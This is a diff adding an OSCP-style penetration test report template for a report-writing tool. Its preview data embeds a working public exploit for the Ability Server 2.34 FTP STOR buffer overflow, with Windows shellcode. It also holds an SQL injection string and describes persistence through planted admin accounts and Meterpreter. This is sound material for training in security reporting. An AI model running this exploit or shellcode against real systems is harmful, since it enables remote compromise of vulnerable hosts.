+The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was able to successfully gain access to 10 out of the 50 systems.
+
+TODO Adapt as required
+"""
+required = true
+
+[project_type.report_fields.report_date]
+type = "date"
+label = "Report Date"
+origin = "custom"
+required = true
+
+[project_type.report_fields.serviceenum]
+type = "markdown"
+label = "Service Enumeration"
+origin = "custom"
+default = """
+The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed.
+
+TODO Adapt as required
+"""
+required = true
+
+[project_type.report_fields.housecleaning]
+type = "markdown"
+label = "House Cleaning"
+origin = "custom"
+default = """
+The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
+
+After the trophies on both the lab network and exam network were completed, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
+
+TODO Adapt as required
+"""
+required = true
+
+[project_type.report_fields.infogathering]
+type = "markdown"
+label = "Information Gathering"
+origin = "custom"
+default = """
+The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was tasked with exploiting the lab and exam network. The specific IP addresses were:
+
+**Exam Network:**
+
+* 172.16.203.133
+* 172.16.203.134
+* 172.16.203.135
+* 172.16.203.136
+
+TODO Adapt as required
+"""
+required = true
+
+[project_type.report_fields.maintainaccess]
+type = "markdown"
+label = "Maintaining Access"
+origin = "custom"
+default = """
+Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit. 
+
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
+
+TODO Adapt as required
+"""
+required = true
+
+[project_type.report_fields.report_version]
+type = "string"
+label = "Report Version"
+origin = "custom"
+default = "1.0"
+required = true
+spellcheck = false
+
+[project_type.report_fields.recommendations]
+type = "markdown"
+label = "Recommendations"
+origin = "custom"
+default = """
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.
+
+TODO Adapt as required
+"""
+required = true
+
+[project_type.report_fields.appendix_sections]
+type = "list"
+label = "Appendix"
+origin = "custom"
+required = true
+
+[project_type.report_fields.appendix_sections.items]
+type = "object"
+label = ""
+origin = "custom"
+
+[project_type.report_fields.appendix_sections.items.properties]
+[project_type.report_fields.appendix_sections.items.properties.title]
+type = "string"
+label = "Title"
+origin = "custom"
+default = "TODO appendix title"
+required = true
+spellcheck = false
+
+[project_type.report_fields.appendix_sections.items.properties.content]
+type = "markdown"
+label = "Content"
+origin = "custom"
+default = "TODO appendix content"
+required = true
+
+[project_type.report_fields.highlevel_summary]
+type = "markdown"
+label = "High-Level Summary"
+origin = "custom"
+default = """
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname}}’s ({{ report.osid}}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
+
+When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.
+
+TODO Adapt summary as required
+"""
+required = true
+
+[[project_type.report_sections]]
+id = "Student"
+label = "Student"
+fields = [
+    "firstname",
+    "lastname",
+    "osid",
+    "mail",
+]
+
+[[project_type.report_sections]]
+id = "other"
+label = "Document Control"
+fields = [
+    "title",
+    "report_date",
+    "report_version",
+    "watermark",
+]
+
+[[project_type.report_sections]]
+id = "high-level_summary"
+label = "High-Level Summary"
+fields = [
+    "highlevel_summary",
+    "recommendations",
+]
+
+[[project_type.report_sections]]
+id = "methodology"
+label = "Methodologies"
+fields = [
+    "methodology",
+    "infogathering",
+    "serviceenum",
+    "penetration",
+    "maintainaccess",
+    "housecleaning",
+]
+
+[[project_type.report_sections]]
+id = "appendix"
+label = "Appendix"
+fields = [
+    "appendix_sections",
+]
+
+[project_type.finding_fields]
+[project_type.finding_fields.title]
+type = "string"
+label = "Target Name"
+origin = "core"
+default = "TODO Target Name"
+required = true
+spellcheck = true
+
+[project_type.finding_fields.cvss]
+type = "cvss"
+label = "CVSS"
+origin = "core"
+default = "n/a"
+required = true
+
+[project_type.finding_fields.ip_address]
+type = "string"
+label = "IP Address"
+origin = "custom"
+default = "TODO IP Address"
+required = true
+spellcheck = false
+
+[project_type.finding_fields.serviceenum]
+type = "markdown"
+label = "Service Enumeration"
+origin = "custom"
+default = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| TODO   | TODO **TCP:** **UDP:**
+
+TODO
+* `nmap -Pn -n 8.8.8.8 | grep open | cut -d/ -f1 | sed 'N;s/\\n/, /g'` for comma separated TCP ports
+* `nmap -sU -Pn -n 8.8.8.8 | grep open | cut -d/ -f1 | sed 'N;s/\\n/, /g'` for comma separated UDP ports
+
+**TODO further enumeration results**
+"""
+required = true
+
+[project_type.finding_fields.initialaccess]
+type = "markdown"
+label = "Initial Access"
+origin = "custom"
+default = """
+**Vulnerability Explation:** TODO
+
+**Vulnerability Fix:** TODO
+
+**Steps to reproduce the attack:** TODO
+
+**Proof of Concept Code:** TODO
+"""
+required = true
+
+[project_type.finding_fields.postexploitation]
+type = "markdown"
+label = "Post Exploitation"
+origin = "custom"
+default = "**System Proof Screenshot:** TODO"
+required = true
+
+[project_type.finding_fields.isActiveDirectory]
+type = "boolean"
+label = "is Active Directory Set?"
+origin = "custom"
+default = false
+
+[project_type.finding_fields.privilegeescalation]
+type = "markdown"
+label = "Privilege Escalation"
+origin = "custom"
+default = """
+**Vulnerability Explanation:** TODO
+
+**Vulnerability Fix:** TODO
+
+**Steps to reproduce the attack:** TODO
+
+**Proof of Concept Code:** TODO
+"""
+required = true
+
+[project_type.report_preview_data]
+[project_type.report_preview_data.report]
+title = "OSCP Penetration Test Report"
+mail = "student@example.com"
+osid = "OS-XXXXX"
+watermark = true
+methodology = "{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) utilized a widely adopted approach to perform penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to identify and exploit the variety of systems and includes all individual vulnerabilities found."
+penetration = "The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was able to successfully gain access to 10 out of the 50 systems."
+report_date = "2022-07-29"
+serviceenum = "The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed."
+housecleaning = """
+The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
+
+After the trophies on both the lab network and exam network were completed, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
+"""
+infogathering = """
+The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was tasked with exploiting the lab and exam network. The specific IP addresses were:
+
+**Exam Network:**
+
+* 172.16.203.133
+* 172.16.203.134
+* 172.16.203.135
+* 172.16.203.136
+"""
+maintainaccess = """
+Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit. 
+
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
+
+"""
+report_version = "1.0"
+recommendations = "{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
+appendix_sections = []
+highlevel_summary = """
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname}}’s ({{ report.osid}}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
+
+When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.
+"""
+firstname = "John"
+lastname = "Doe"
+
+[[project_type.report_preview_data.findings]]
+title = "Target #1"
+cvss = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+id = "c7f12f17-96bf-4899-b10f-2b1a513382e8"
+ip_address = "172.16.203.134"
+serviceenum = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| 172.16.203.134  | **TCP:** 22, 79, 80, 105, 106, 110, 135, 139, 143, 445, 2224, 3306, 3389 |
+
+**FTP Enumeration**
+Upon manual enumeration of the available FTP service, John noticed it was running an outdated version 2.3.4 that is prone to the remote buffer overflow vulnerability.
+"""
+initialaccess = """
+**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.
+
+**Vulnerability Fix:** The publishers of the Ability Server have issued a patch to fix this known issue. It can be found here: [http://www.code-crafters.com/abilityserver/](http://www.code-crafters.com/abilityserver/)
+
+**Steps to reproduce the attack:** The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.
+
+**Proof of Concept Code:**
+```python highlight-manual
+###################################
+# Ability Server 2.34 FTP STOR Buffer Overflow # Advanced, secure and easy to use FTP Server. # 21 Oct 2004 - muts ###################################
+# D:\\BO>ability-2.34-ftp-stor.py ###################################
+# D:\\data\\tools>nc -v 127.0.0.1 4444
+# localhost [127.0.0.1] 4444 (?) open
+# Microsoft Windows XP [Version 5.1.2600]
+# (C) Copyright 1985-2001 Microsoft Corp.
+# D:\\Program Files\\abilitywebserver> ###################################
+
+import ftplib
+from ftplib import FTP
+import struct
+
+print "\\n\\n################################"
+print "\\nAbility Server 2.34 FTP STOR buffer Overflow" print "\\nFor Educational Purposes Only!\\n"
+print "###################################"
+
+# Shellcode taken from Sergio Alvarez's "Win32 Stack Buffer Overflow Tutorial"
+sc = "\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\\x5e\\x81\\x73\\x17\\xe0\\x66"
+sc += "\\x1c\\xc2\\x83\\xeb\\xfc\\xe2\\xf4\\x1c\\x8e\\x4a\\xc2\\xe0\\x66\\x4f\\x97\\xb6" 
+sc += "\\x1a\\x38\\xd6\\x95\\x87\\x97\\x98\\xc4\\x67\\xf7\\xa4\\x6b\\x6a\\x57\\x49\\xba" 
+sc += "\\x7a\\x1d\\x29\\x6b\\x62\\x97\\xc3\\x08\\x8d\\x1e\\xf3\\x20\\x39\\x42\\x9f\\xbb" 
+sc += "\\xa4\\x14\\xc2\\xbe\\x0c\\x2c\\x9b\\x84\\xed\\x05\\x49\\xbb\\x6a\\x97\\x99\\xfc" 
+sc += "\\xed\\x07\\x49\\xbb\\x6e\\x4f\\xaa\\x6e\\x28\\x12\\x2e\\x1f\\xb0\\x95\\x05\\x61" 
+sc += "\\x8a\\x1c\\xc3\\xe0\\x66\\x4b\\x94\\xb3\\xef\\xf9\\x2a\\xc7\\x66\\x1c\\xc2\\x70" 
+sc += "\\x67\\x1c\\xc2\\x56\\x7f\\x04\\x25\\x44\\x7f\\x6c\\x2b\\x05\\x2f\\x9a\\x8b\\x44" 
+sc += "\\x7c\\x6c\\x05\\x44\\xcb\\x32\\x2b\\x39\\x6f\\xe9\\x6f\\x2b\\x8b\\xe0\\xf9\\xb7" 
+sc += "\\x35\\x2e\\x9d\\xd3\\x54\\x1c\\x99\\x6d\\x2d\\x3c\\x93\\x1f\\xb1\\x95\\x1d\\x69" 
+sc += "\\xa5\\x91\\xb7\\xf4\\x0c\\x1b\\x9b\\xb1\\x35\\xe3\\xf6\\x6f\\x99\\x49\\xc6\\xb9" 
+sc += "\\xef\\x18\\x4c\\x02\\x94\\x37\\xe5\\xb4\\x99\\x2b\\x3d\\xb5\\x56\\x2d\\x02\\xb0" 
+sc += "\\x36\\x4c\\x92\\xa0\\x36\\x5c\\x92\\x1f\\x33\\x30\\x4b\\x27\\x57\\xc7\\x91\\xb3" 
+sc += "\\x0e\\x1e\\xc2\\xf1\\x3a\\x95\\x22\\x8a\\x76\\x4c\\x95\\x1f\\x33\\x38\\x91\\xb7" 
+sc += "\\x99\\x49\\xea\\xb3\\x32\\x4b\\x3d\\xb5\\x46\\x95\\x05\\x88\\x25\\x51\\x86\\xe0" 
+sc += "\\xef\\xff\\x45\\x1a\\x57\\xdc\\x4f\\x9c\\x42\\xb0\\xa8\\xf5\\x3f\\xef\\x69\\x67" 
+sc += "\\x9c\\x9f\\x2e\\xb4\\xa0\\x58\\xe6\\xf0\\x22\\x7a\\x05\\xa4\\x42\\x20\\xc3\\xe1" 
+sc += "\\xef\\x60\\xe6\\xa8\\xef\\x60\\xe6\\xac\\xef\\x60\\xe6\\xb0\\xeb\\x58\\xe6\\xf0" 
+sc += "\\x32\\x4c\\x93\\xb1\\x37\\x5d\\x93\\xa9\\x37\\x4d\\x91\\xb1\\x99\\x69\\xc2\\x88" 
+sc += "\\x14\\xe2\\x71\\xf6\\x99\\x49\\xc6\\x1f\\xb6\\x95\\x24\\x1f\\x13\\x1c\\xaa\\x4d" 
+sc += "\\xbf\\x19\\x0c\\x1f\\x33\\x18\\x4b\\x23\\x0c\\xe3\\x3d\\xd6\\x99\\xcf\\x3d\\x95" 
+sc += "\\x66\\x74\\x32\\x6a\\x62\\x43\\x3d\\xb5\\x62\\x2d\\x19\\xb3\\x99\\xcc\\xc2"
+
+# Change RET address if need be.
+buffer = §§'\\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\\x42'*32+sc§§ # RET Windows 2000 Server SP4
+
+#buffer = '\\x41'*970+struct.pack('<L', 0x7D17D737)+'\\x42'*32+sc # RET Windows XP SP2 try:
+
+# Edit the IP, Username and Password.
+ftp = FTP('§§127.0.0.1§§')
+ftp.login('§§ftp§§','§§ftp§§')
+print "\\nEvil Buffer sent..."
+print "\\nTry connecting with netcat to port 4444 on the remote machine." except:
+print "\\nCould not Connect to FTP Server."
+
+try:
+ftp.transfercmd("STOR " + buffer)
+except:
+print "\\nDone."
+```
+"""
+postexploitation = ""
+isActiveDirectory = false
+privilegeescalation = """
+**Vulnerability Explation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks. Using Chisel for port forwarding, John was able to access the web application. When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter. While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP. This allowed for a successful breach of the operating system as well as all data contained on the system.
+
+**Vulnerability Fix:** Since this is a custom web application, a specific update will not properly solve this issue. The application will need to be programmed to properly sanitize user-input
+data, ensure that the user is running off of a limited user account, and that any sensitive data stored within the SQL database is properly encrypted. Custom error messages are highly recommended, as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them.
+
+**Steps to reproduce the attack:**
+```
+SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"
+```
+
+"""
+
+[[project_type.assets]]
+id = "020dcb56-d3b1-401d-b311-a36928c11ce9"
+name = "LICENSE"
